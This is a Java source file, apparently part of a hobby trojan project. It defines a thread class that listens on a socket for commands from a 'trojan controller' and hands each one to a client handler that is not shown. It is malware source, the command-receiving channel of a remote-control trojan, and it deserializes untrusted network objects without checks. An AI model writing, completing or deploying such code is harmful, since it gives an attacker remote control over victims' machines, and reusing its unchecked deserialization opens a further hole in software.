/**
 * Created by pontu on 2018-02-19.
 */

import java.io.*;
import java.net.*;
/*
Class used to wait for replies from the trojan controller.
 */
public class Reply extends Thread{
    private Socket socket;
    private BufferedReader br;
    private boolean alive = true;
    private boolean active = true;
    private THClient thClient;
    private ObjectInputStream ois;
    private Storage stored;
    private BufferedReader in;

    /*
    Initiates the objectInputStream and starts the run() method.
     */
    Reply(Socket skt, THClient thc){
        socket = skt;
        thClient = thc;
        try {
            ois = new ObjectInputStream(socket.getInputStream());
        }catch(Exception e) {
            e.printStackTrace();
        }
        start();
    }

    /*
    Run method used to constantly wait for new commands from the trojan controller.
    once a command is received its sent to the thClient to deal with using the
    dealWIthCommand() method.
     */
    public void run() {
        while(alive) {
            while(active) {
                try {
                    Thread.sleep(100);
                    Storage storage;
                    while((storage = (Storage) ois.readObject()) != null) {
                        if(storage.getData() != null) {
                            stored = storage;
                        }
                        String command = storage.getCommand();
                        thClient.dealWithCommand(command);
                    }
                }catch(Exception e) {
                    e.printStackTrace();
                    System.out.println("Not connected to server");
                    active = false;
                    alive = false;
                }
            }
        }
    }
    /*
    Method used to get the stored storage object.
     */
    public Storage getStored() {
        return stored;
    }
    public void setAlive(boolean a) {
        active = a;
        alive = a;
    }
    public void setActive(boolean a) {
        active = a;
    }
}
